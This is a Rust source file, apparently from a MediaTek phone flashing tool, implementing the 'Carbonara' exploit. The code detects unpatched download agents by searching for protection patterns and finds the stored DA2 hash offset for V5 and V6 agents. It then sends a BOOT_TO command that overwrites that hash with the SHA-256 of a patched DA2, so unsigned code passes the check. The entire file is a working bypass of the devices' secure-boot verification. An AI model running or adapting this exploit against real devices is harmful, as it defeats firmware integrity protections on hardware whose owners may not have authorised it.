/*
    SPDX-License-Identifier: AGPL-3.0-or-later
    SPDX-FileCopyrightText: 2025 Shomy
*/
use std::sync::Arc;
use std::time::Duration;

use log::{debug, info};
use sha2::{Digest, Sha256};
use tokio::sync::Mutex;
use tokio::time::timeout;

use crate::connection::port::ConnectionType;
use crate::da::{DA, DAEntryRegion, DAProtocol, DAType};
use crate::exploit::{BootStage, Exploit, ExploitMeta};

pub struct Carbonara {
    meta: ExploitMeta,
    da: Arc<Mutex<DA>>,
    patched_da2: Option<DAEntryRegion>,
}

impl Carbonara {
    pub fn new(da: Arc<Mutex<DA>>) -> Self {
        Carbonara {
            meta: ExploitMeta {
                name: String::from("Carbonara"),
                boot_mode: vec![ConnectionType::Brom, ConnectionType::Preloader],
                boot_stage: BootStage::Da1,
            },
            da,
            patched_da2: None,
        }
    }

    async fn is_vulnerable(&self) -> bool {
        // These patterns were taken from mtkclient
        let tests: [&[u8]; 3] = [
            b"\x01\x01\x54\xE3\x01\x14\xA0\xE3",
            b"\x08\x00\xA8\x52\xFF\x02\x08\xEB",
            b"\x06\x9B\x4F\xF0\x80\x40\x02\xA9",
        ];
        let da = self.da.lock().await;
        if let Some(da1) = da.get_da1() {
            for pattern in tests.iter() {
                if da1.data.windows(pattern.len()).any(|w| w == *pattern) {
                    debug!("[Carbonara] Found protection pattern, device not vulnerable");
                    return false;
                }
            }
            debug!("[Carbonara] No protection patterns found, device potentially vulnerable");
            true
        } else {
            debug!("[Carbonara] No DA1 found, can't determine vulnerability");
            false
        }
    }

    pub fn get_patched_da2(&self) -> Option<&DAEntryRegion> {
        self.patched_da2.as_ref()
    }

    // TODO: Consider making this part of da.rs instead, as kamakiri requires it as well
    async fn find_da_hash_offset(&self) -> Option<usize> {
        let da_borrow = self.da.lock().await;

        match da_borrow.da_type {
            // V5 hashes are easily found 0x30 bytes before the "MMU MAP: VA" string in the DA1
            // region. We can confirm the position of the hash as well in Ghidra: when looking
            // at the boot_to function, we'll find something like DAT_0022DEA4.
            // Because of its odd position, hash for V5 is harder to find than V6, but, from
            // all the DAs I've analyzed, the position is pretty consintent.
            // MTKClient confirms this as well, so this is probably correct.
            DAType::V5 => {
                if let Some(da1) = da_borrow.get_da1() {
                    let search_str = b"MMU MAP: VA";
                    if let Some(pos) =
                        da1.data.windows(search_str.len()).position(|window| window == search_str)
                    {
                        let hash_pos = pos.checked_sub(0x30)?;
                        return Some(hash_pos);
                    }
                }
                None
            }
            // Note to self:
            // V6 hashes are located near the DA1 signature
            // To find them in a hex editor, get DA1 offset and DA1 length,
            // Select block, remove 0x100 bytes (signature) and search backwards for 0x30 bytes
            // The hash will be there :3
            // TODO: Add XML once I'll get a V6 device to test with
            DAType::V6 => {
                if let Some(da1) = da_borrow.get_da1() {
                    // TODO: Consider being a decent human being and actually make sig_len a usize
                    let search_end = da1.data.len().checked_sub(da1.sig_len as usize)?;
                    let search_start = search_end.checked_sub(0x30)?;
                    if search_end <= da1.data.len() {
                        let hash_candidate = &da1.data[search_start..search_end];
                        if hash_candidate.ends_with(&[0, 0, 0, 0]) {
                            return Some(search_start);
                        }
                    }
                }
                None
            }
            // Y'all, I don't even think DALegacy can be exploited with Carbonara!!
            // TODO: Confirm this (which means, get a legacy device to test with and study the
            // protocol)
            _ => None,
        }
    }
}

#[async_trait::async_trait]
impl Exploit for Carbonara {
    async fn run<T: DAProtocol + Send>(&mut self, protocol: &mut T) -> Result<bool, String> {
        if !self.is_vulnerable().await {
            return Err(String::from("Device is not vulnerable to Carbonara exploit"));
        }

        info!("[Exploit] Device is vulnerable to Carbonara! Cooking...");

        let da2 = {
            let da = self.da.lock().await;
            match da.get_da2() {
                Some(da2) => da2.clone(),
                None => return Err("DA2 region not found".to_string()),
            }
        };

        // Fallback
        self.patched_da2 = Some(da2.clone());

        let hash_offset = match self.find_da_hash_offset().await {
            Some(offset) => offset,
            None => return Err("Failed to find DA1 hash offset".to_string()),
        };
        debug!("[Exploit] Found DA1 hash offset at 0x{:X}", hash_offset);

        let da1_addr = {
            let da = self.da.lock().await;
            match da.get_da1() {
                Some(da1) => da1.addr,
                None => return Err("DA1 region not found".to_string()),
            }
        };

        // This emulates Ghidra behaviours (this is also required btw)
        // 0x2DEA4 -> 0x22DEA4
        let virtual_addr = hash_offset as u32 + da1_addr;

        self.patched_da2 = protocol.patch_da2();

        let mut hasher = Sha256::new();
        if let Some(ref da2) = self.patched_da2 {
            hasher.update(&da2.data);
        }

        let hash_result = hasher.finalize();
        debug!("[Exploit] Computed DA2 SHA256 hash: {:x}", hash_result);

        match timeout(
            Duration::from_secs(5),
            protocol.boot_to(virtual_addr, hash_result.as_slice()),
        )
        .await
        {
            Ok(_) => debug!("[Exploit] Sent Carbonara DA2 hash"),
            Err(e) => return Err(format!("Failed to send BOOT_TO command: {}", e)),
        }

        info!("[Exploit] Carbonara got served! Enjoy your meal ;)");

        Ok(true)
    }

    fn get_meta(&self) -> &ExploitMeta {
        &self.meta
    }
}
